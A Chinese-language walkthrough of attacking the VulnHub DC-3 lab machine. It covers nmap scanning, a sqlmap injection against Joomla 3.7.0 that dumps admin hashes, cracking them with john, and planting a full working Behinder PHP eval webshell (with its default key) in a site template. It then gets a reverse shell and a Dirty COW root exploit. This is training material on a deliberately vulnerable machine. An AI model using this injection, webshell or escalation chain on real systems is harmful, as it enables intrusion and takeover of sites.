vulnhub之DC-3靶机渗透详细过程
2022-01-23 20:24:08

用到的工具：nmap 发现靶机地址、扫描端口及其服务

whatweb             信息搜集


searchsploit 搜索可利用的漏洞

sqlmap sql注入工具

john 一 个快速的密码破解工具,用于在已知密文的情况下尝试破解出明文,支持目前大多数的加密算法

dirsearch 目录扫描工具

behinder webshell管理工具

Metasploit 一款开源的漏洞检测和利用工具
使用nmap扫描靶机ip

nmap 192.168.26.0/24


发现靶机ip为 192.168.26.131 本次使用kali2020，kali IP为192.168.26.20

使用nmap扫描靶机具体信息

nmap -sS -sV -T4 -A -p- 192.168.26.131


也没发现什么有用的信息，只有一个80端口，访问网页，利用kali自带的信息搜集工具whatweb发现是joolma，尝试使用msf搜索joolma相关漏洞

search joomla
use auxiliary/scanner/http/joomla_version         #扫描joolma的版本，便于我们寻找利用漏洞
show options
set rhosts 192.168.26.131
set rport 80
set targeturl http://192.168.26.131/index.php
set threads 30
exploit


成功获取到joolma的版本

searchsploit joomla 3.7.0     #搜索joomla 3.7.0的漏洞

cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla_SQL.txt
cat joomla_SQL.txt       通过查看这个文件我们发现可以使用sqlmap以下语句进行sql注入
sqlmap -u "http://192.168.26.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


成功获取到数据库的名字

sqlmap -u "http://192.168.26.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]


获取到了joomladb数据库下的所有表名，接下来我们查#__users表下的字段

sqlmap -u "http://192.168.26.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns -p list[fullordering]


sqlmap -u "http://192.168.26.131/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C "name,password" --dump -p list[fullordering]


成功获取到了admin账户的密码，但是是加密的，我们需要解密，这里我们使用kali自带的解密工具john

touch DC-3password.txt
vim   DC-3password.txt  #将admin账户 加密后的密码写入到该文件
john   DC-3password.txt       #使用john工具解密


我们可以使用dirsearch扫描目录，看看能否有所发现，

通过上图中的扫描结果我们访问，发现了后台登录地址

尝试利用获取到的账户：admin和密码：snoopy进行登录，成功进入后台，找到编辑页面的地方，在合适的地方插入我们的木马文件

并保存，然后访问该页面，http://192.168.26.131/templates/beez3/index.php

上传的木马文件如下

<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>


使用冰蝎连接我们的后门文件

然后使用冰蝎的反弹shell模块给我们kali反弹一个shell，按照冰蝎的提示在kali上使用msf监听对应端口即可，然后点击给我连的按钮，即可在kali上获取到会话，以便于我们进一步的操作。

kali获取到了会话，那么我们上传漏洞发现脚本，看看是否能发现可利用的漏洞

上传信息搜索脚本

upload /root/linux-exploit-suggester.sh  192.168.26.131 /tmp

shell
cd /tmp
chmod +x linux-exploit-suggester.sh     #赋予执行权限
./linux-exploit-suggester.sh          #运行该脚本


进入到对应目录，运行脚本，发现存在脏牛提权漏洞

访问上图中的exp下载链接，下载exp到本地，然后上传到靶机

upload /root/dcow.cpp   192.168.26.128 /tmp  #上传exp到靶机的 /tmp目录下
shell
python -c 'import pty;pty.spawn("/bin/bash")'   #优化终端界面，便于操作
cd /tmp
chmod +x dcow.cpp
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil
##########################################
-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告
-pedantic 允许发出ANSI/ISO C标准所列出的所有警告
-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高
-std=c++11就是用按C++2011标准来编译的
-pthread    在Linux中要用到多线程时，需要链接pthread库
-o dcow    gcc生成的目标文件,名字为dcow
##########################################
./dcow               #执行


我们可以看到运行完脏牛提权exp后，成功切换到了root用户，并获取到了flag。DC-3的打靶过程到这里就结束了。
